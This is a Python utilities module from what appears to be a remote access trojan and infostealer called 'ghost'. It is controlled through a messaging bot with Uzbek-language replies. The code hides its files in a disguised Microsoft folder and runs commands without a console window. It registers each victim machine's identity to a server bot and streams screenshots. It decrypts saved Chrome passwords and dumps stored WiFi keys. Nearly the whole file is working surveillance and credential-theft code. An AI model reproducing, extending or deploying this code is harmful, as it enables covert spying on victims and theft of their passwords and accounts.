# utils.py - v3.0.6 ASYNC NON-BLOCKING UTILITIES
"""
v3.0.6 Architecture:
- Client sends /ghost_register to SERVER_BOT_ID (not ADMIN_ID)
- Server bot receives and processes device registrations
- All blocking I/O wrapped in run_in_executor
"""

import asyncio
import os
import sys
import json
import getpass
import shutil
import socket
import time
import sqlite3
import base64
import zipfile
import io
import ctypes
import logging
import subprocess
from pathlib import Path
from typing import Optional, Dict, Any, Tuple, Callable
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# ==================== LOGGING ====================
logger = logging.getLogger(__name__)

# ==================== THREAD POOL ====================
# Dedicated executor for CPU-bound and blocking operations
_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="ghost_worker")


def get_executor() -> ThreadPoolExecutor:
    """Get shared thread pool executor"""
    return _executor


async def run_blocking(func: Callable, *args, **kwargs) -> Any:
    """
    Run blocking function in thread pool
    This is THE pattern for all blocking operations!
    """
    loop = asyncio.get_event_loop()
    if kwargs:
        func = partial(func, **kwargs)
    return await loop.run_in_executor(_executor, func, *args)


# ==================== OPTIONAL IMPORTS ====================
# Graceful handling - bot won't crash if module is missing

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    ImageGrab = None
    Image = None
    PIL_AVAILABLE = False
    logger.warning("PIL not available - screenshots disabled")

try:
    import pyautogui
    pyautogui.FAILSAFE = False  # Disable fail-safe
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False
    logger.warning("PyAutoGUI not available - input control disabled")

try:
    from Crypto.Cipher import AES
    PYCRYPTODOME_AVAILABLE = True
except ImportError:
    AES = None
    PYCRYPTODOME_AVAILABLE = False
    logger.warning("PyCryptodome not available - password decryption disabled")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False
    logger.warning("psutil not available - system info limited")

try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    cv2 = None
    OPENCV_AVAILABLE = False
    logger.warning("OpenCV not available - webcam disabled")

try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    pyaudio = None
    PYAUDIO_AVAILABLE = False
    logger.warning("PyAudio not available - audio recording disabled")


# ==================== CONFIG IMPORT ====================
try:
    from config import (
        ADMIN_ID, SERVER_BOT_ID, MAX_FILE_SIZE, SCREENSHOT_QUALITY, 
        LIVE_STREAM_FPS, CURRENT_VERSION
    )
except ImportError:
    ADMIN_ID = 0
    SERVER_BOT_ID = 0  # v3.0.6: Bot ID for receiving messages
    MAX_FILE_SIZE = 50 * 1024 * 1024
    SCREENSHOT_QUALITY = 85
    LIVE_STREAM_FPS = 2
    CURRENT_VERSION = "3.0.6"


# ==================== GLOBAL STATE ====================
class ClientState:
    """Thread-safe client state"""
    
    def __init__(self):
        self._selected_device: Optional[str] = None
        self._live_active: bool = False
        self._live_message_id: Optional[int] = None
        self._recording_active: bool = False
        self._keylogger_active: bool = False
        self._lock = asyncio.Lock()
    
    @property
    def selected_device(self) -> Optional[str]:
        return self._selected_device
    
    @selected_device.setter
    def selected_device(self, value: Optional[str]):
        self._selected_device = value
    
    @property
    def is_live_active(self) -> bool:
        return self._live_active
    
    async def start_live(self, message_id: int):
        async with self._lock:
            self._live_active = True
            self._live_message_id = message_id
    
    async def stop_live(self):
        async with self._lock:
            self._live_active = False
            self._live_message_id = None
    
    @property
    def is_recording(self) -> bool:
        return self._recording_active


# Global state instance
state = ClientState()


# ==================== FILE PATHS ====================
def get_hidden_path(filename: str) -> Path:
    """Get path in hidden system folder"""
    base = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Crypto" / "system"
    base.mkdir(parents=True, exist_ok=True)
    return base / filename


DEVICES_FILE = get_hidden_path("net.dat")
SESSION_NAME = str(get_hidden_path("session"))
VERSION_FILE = get_hidden_path("version.txt")


# ==================== STEALTH SUBPROCESS ====================
# Use CREATE_NO_WINDOW flag to avoid console popups

CREATION_FLAGS = 0
if sys.platform == "win32":
    CREATION_FLAGS = subprocess.CREATE_NO_WINDOW


def run_command_silent(cmd: str, shell: bool = True, timeout: int = 30) -> Tuple[int, str, str]:
    """
    Run command silently without console window
    Returns: (returncode, stdout, stderr)
    """
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout,
            creationflags=CREATION_FLAGS
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)


async def run_command_async(cmd: str, timeout: int = 30) -> Tuple[int, str, str]:
    """Run command in executor - non-blocking"""
    return await run_blocking(run_command_silent, cmd, timeout=timeout)


# ==================== DEVICE REGISTRATION ====================
async def register_device(client) -> bool:
    """
    Register device with server (async)
    Sends /ghost_register to server bot
    """
    try:
        import platform
        import uuid
        import hashlib
        
        # Collect device info in executor (blocking operations)
        def collect_info():
            username = getpass.getuser()
            hostname = socket.gethostname()
            
            # Generate unique device ID
            mac = uuid.getnode()
            mac_hex = '{:012x}'.format(mac)
            mac_hash = hashlib.md5(mac_hex.encode()).hexdigest()[:6]
            random_suffix = hashlib.md5(str(time.time()).encode()).hexdigest()[:4]
            device_id = f"DEV-{hostname[:15]}-{mac_hash}-{random_suffix}"
            
            # Get local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "Unknown"
            
            # System info
            info = {
                'hostname': hostname,
                'username': username,
                'os': platform.system(),
                'os_version': platform.version(),
                'os_release': platform.release(),
                'local_ip': local_ip,
                'mac_address': ':'.join(['{:02x}'.format((mac >> i) & 0xff) 
                                        for i in range(0, 48, 8)][::-1])
            }
            
            # Extended info with psutil
            if PSUTIL_AVAILABLE:
                try:
                    info['cpu_cores'] = psutil.cpu_count(logical=True)
                    ram = psutil.virtual_memory()
                    info['ram_total_gb'] = round(ram.total / (1024**3), 2)
                    disk = psutil.disk_usage('/')
                    info['disk_total_gb'] = round(disk.total / (1024**3), 2)
                except:
                    pass
            
            return device_id, info
        
        device_id, info = await run_blocking(collect_info)
        
        # Prepare registration message
        reg_data = {
            'device_id': device_id,
            'info': info,
            'version': CURRENT_VERSION
        }
        
        # Send to server bot (v3.0.6: bot receives, not admin)
        message = f"/ghost_register {json.dumps(reg_data, ensure_ascii=False)}"
        await client.send_message(SERVER_BOT_ID, message, silent=True)
        
        logger.info(f"Device registered: {device_id}")
        
        # Start heartbeat loop
        asyncio.create_task(heartbeat_loop(client, device_id))
        
        return True
        
    except Exception as e:
        logger.error(f"Device registration error: {e}")
        return False


async def heartbeat_loop(client, device_id: str, interval: int = 60):
    """Background heartbeat to keep connection alive"""
    while True:
        try:
            await asyncio.sleep(interval)
            
            hb_data = {
                'device_id': device_id,
                'status': 'online',
                'timestamp': time.time()
            }
            
            message = f"/ghost_heartbeat {json.dumps(hb_data)}"
            await client.send_message(SERVER_BOT_ID, message, silent=True)  # v3.0.6: to bot
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.debug(f"Heartbeat error: {e}")


# ==================== SCREENSHOTS (NON-BLOCKING) ====================
def _take_screenshot_sync(quality: int = 85) -> Optional[bytes]:
    """Blocking screenshot - run in executor!"""
    if not PIL_AVAILABLE:
        return None
    
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
        return buffer.getvalue()
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return None


async def take_screenshot(quality: int = SCREENSHOT_QUALITY) -> Optional[bytes]:
    """Take screenshot asynchronously"""
    return await run_blocking(_take_screenshot_sync, quality)


async def send_screenshot(client, chat_id: int) -> bool:
    """Take and send screenshot"""
    try:
        # Non-blocking screenshot
        image_bytes = await take_screenshot()
        
        if not image_bytes:
            await client.send_message(chat_id, "❌ Screenshot olib bo'lmadi")
            return False
        
        # Send image
        await client.send_file(
            chat_id,
            io.BytesIO(image_bytes),
            caption=f"📸 Screenshot\n🕐 {time.strftime('%H:%M:%S')}",
            file_name="screenshot.jpg"
        )
        return True
        
    except Exception as e:
        logger.error(f"Send screenshot error: {e}")
        await client.send_message(chat_id, f"❌ Xato: {e}")
        return False


# ==================== LIVE STREAM (NON-BLOCKING) ====================
async def start_live_stream(client, chat_id: int, fps: int = LIVE_STREAM_FPS):
    """Start live stream with async screenshots"""
    if not PIL_AVAILABLE:
        await client.send_message(chat_id, "❌ PIL mavjud emas")
        return
    
    try:
        # Send initial message
        msg = await client.send_message(chat_id, "🎥 **Jonli Efir Boshlanmoqda...**")
        await state.start_live(msg.id)
        
        interval = 1.0 / fps
        
        while state.is_live_active:
            try:
                # Non-blocking screenshot
                image_bytes = await take_screenshot(quality=60)
                
                if image_bytes:
                    await client.edit_message(
                        chat_id, msg,
                        file=io.BytesIO(image_bytes),
                        text=f"🔴 LIVE | {time.strftime('%H:%M:%S')}"
                    )
                
                await asyncio.sleep(interval)
                
            except Exception as e:
                logger.debug(f"Live frame error: {e}")
                await asyncio.sleep(0.5)
        
        await client.edit_message(chat_id, msg, text="⏹ Jonli efir to'xtatildi")
        
    except Exception as e:
        logger.error(f"Live stream error: {e}")
        await state.stop_live()


async def stop_live_stream():
    """Stop live stream"""
    await state.stop_live()


# ==================== VOLUME CONTROL (STEALTH) ====================
def _volume_key(key_code: int):
    """Send volume key using ctypes - no subprocess!"""
    try:
        KEYEVENTF_EXTENDEDKEY = 0x0001
        KEYEVENTF_KEYUP = 0x0002
        
        ctypes.windll.user32.keybd_event(key_code, 0, KEYEVENTF_EXTENDEDKEY, 0)
        ctypes.windll.user32.keybd_event(key_code, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0)
    except Exception as e:
        logger.error(f"Volume key error: {e}")


async def volume_up():
    """Increase volume"""
    await run_blocking(_volume_key, 0xAF)  # VK_VOLUME_UP
    return True


async def volume_down():
    """Decrease volume"""
    await run_blocking(_volume_key, 0xAE)  # VK_VOLUME_DOWN
    return True


async def mute():
    """Mute volume"""
    await run_blocking(_volume_key, 0xAD)  # VK_VOLUME_MUTE
    return True


async def unmute():
    """Unmute (same as mute toggle)"""
    await run_blocking(_volume_key, 0xAD)
    return True


# ==================== CHROME PASSWORDS (NON-BLOCKING) ====================
def _get_chrome_passwords_sync() -> list:
    """Get Chrome passwords - run in executor!"""
    if not PYCRYPTODOME_AVAILABLE:
        return [{"error": "PyCryptodome not available"}]
    
    passwords = []
    
    try:
        # Chrome paths
        local_state_path = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Local State'
        login_db_path = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'Login Data'
        
        if not login_db_path.exists():
            return [{"error": "Chrome database not found"}]
        
        # Get encryption key
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        
        # Decrypt key using DPAPI
        import ctypes.wintypes
        
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD),
                       ("pbData", ctypes.POINTER(ctypes.c_char))]
        
        blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(encrypted_key, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            key = bytes(blob_out.pbData[:blob_out.cbData])
        else:
            return [{"error": "Failed to decrypt key"}]
        
        # Copy database (it's locked by Chrome)
        temp_db = Path(os.environ['TEMP']) / 'login_temp.db'
        shutil.copy2(login_db_path, temp_db)
        
        # Read passwords
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, username, encrypted_password in cursor.fetchall():
            if encrypted_password and username:
                try:
                    # Decrypt password
                    iv = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:-16]
                    tag = encrypted_password[-16:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                    
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
                except:
                    continue
        
        conn.close()
        temp_db.unlink(missing_ok=True)
        
    except Exception as e:
        logger.error(f"Chrome password error: {e}")
        passwords = [{"error": str(e)}]
    
    return passwords


async def get_chrome_passwords() -> list:
    """Get Chrome passwords asynchronously"""
    return await run_blocking(_get_chrome_passwords_sync)


# ==================== WIFI PASSWORDS (NON-BLOCKING) ====================
def _get_wifi_passwords_sync() -> list:
    """Get WiFi passwords - run in executor!"""
    passwords = []
    
    try:
        # Get profiles
        returncode, stdout, stderr = run_command_silent(
            'netsh wlan show profiles', timeout=10
        )
        
        if returncode != 0:
            return [{"error": "WiFi not available"}]
        
        # Extract profile names
        profiles = []
        for line in stdout.split('\n'):
            if "All User Profile" in line or "Все профили" in line:
                profile = line.split(':')[-1].strip()
                if profile:
                    profiles.append(profile)
        
        # Get password for each profile
        for profile in profiles:
            returncode, stdout, stderr = run_command_silent(
                f'netsh wlan show profile name="{profile}" key=clear',
                timeout=5
            )
            
            if returncode == 0:
                password = ""
                for line in stdout.split('\n'):
                    if "Key Content" in line or "Содержимое ключа" in line:
                        password = line.split(':')[-1].strip()
                        break
                
                passwords.append({
                    'ssid': profile,
                    'password': password or "(no password)"
                })
        
    except Exception as e:
        logger.error(f"WiFi password error: {e}")
        passwords = [{"error": str(e)}]
    
    return passwords


async def get_wifi_passwords() -> list:
    """Get WiFi passwords asynchronously"""
    return await run_blocking(_get_wifi_passwords_sync)


# ==================== SYSTEM INFO (NON-BLOCKING) ====================
def _get_system_info_sync() -> Dict[str, Any]:
    """Get system info - run in executor!"""
    info = {}
    
    try:
        import platform
        
        info['hostname'] = socket.gethostname()
        info['username'] = getpass.getuser()
        info['os'] = f"{platform.system()} {platform.release()}"
        info['os_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['processor'] = platform.processor()[:50] if platform.processor() else 'Unknown'
        
        if PSUTIL_AVAILABLE:
            # CPU
            info['cpu_count'] = psutil.cpu_count(logical=False)
            info['cpu_cores'] = psutil.cpu_count(logical=True)
            info['cpu_percent'] = psutil.cpu_percent(interval=0.5)
            
            # Memory
            ram = psutil.virtual_memory()
            info['ram_total'] = f"{ram.total / (1024**3):.2f} GB"
            info['ram_used'] = f"{ram.used / (1024**3):.2f} GB"
            info['ram_percent'] = ram.percent
            
            # Disk
            disk = psutil.disk_usage('/')
            info['disk_total'] = f"{disk.total / (1024**3):.2f} GB"
            info['disk_free'] = f"{disk.free / (1024**3):.2f} GB"
            info['disk_percent'] = disk.percent
            
            # Boot time
            info['boot_time'] = time.strftime(
                '%Y-%m-%d %H:%M:%S', 
                time.localtime(psutil.boot_time())
            )
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            info['local_ip'] = "Unknown"
        
    except Exception as e:
        info['error'] = str(e)
    
    return info


async def get_system_info() -> Dict[str, Any]:
    """Get system info asynchronously"""
    return await run_blocking(_get_system_info_sync)


# ==================== PROCESS LIST (NON-BLOCKING) ====================
async def get_processes(top: int = 20) -> list:
    """Get top processes by CPU usage"""
    if not PSUTIL_AVAILABLE:
        return [{"error": "psutil not available"}]
    
    def _get_procs():
        procs = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.info
                procs.append({
                    'pid': info['pid'],
                    'name': info['name'][:30],
                    'cpu': info['cpu_percent'],
                    'memory': info['memory_percent']
                })
            except:
                continue
        
        return sorted(procs, key=lambda x: x['cpu'], reverse=True)[:top]
    
    return await run_blocking(_get_procs)


async def kill_process(pid: int) -> bool:
    """Kill process by PID"""
    if not PSUTIL_AVAILABLE:
        return False
    
    def _kill():
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            return True
        except:
            return False
    
    return await run_blocking(_kill)


# ==================== FILE OPERATIONS (NON-BLOCKING) ====================
async def make_archive(source_dir: str, output_path: str) -> Optional[str]:
    """Create zip archive asynchronously"""
    def _archive():
        try:
            shutil.make_archive(output_path, 'zip', source_dir)
            return f"{output_path}.zip"
        except Exception as e:
            logger.error(f"Archive error: {e}")
            return None
    
    return await run_blocking(_archive)


async def list_directory(path: str) -> list:
    """List directory contents"""
    def _list():
        items = []
        try:
            p = Path(path)
            for item in p.iterdir():
                items.append({
                    'name': item.name,
                    'is_dir': item.is_dir(),
                    'size': item.stat().st_size if item.is_file() else 0
                })
        except Exception as e:
            items = [{"error": str(e)}]
        return items
    
    return await run_blocking(_list)


# ==================== CLEANUP ====================
def cleanup():
    """Cleanup resources"""
    _executor.shutdown(wait=False)
    logger.info("Executor shutdown")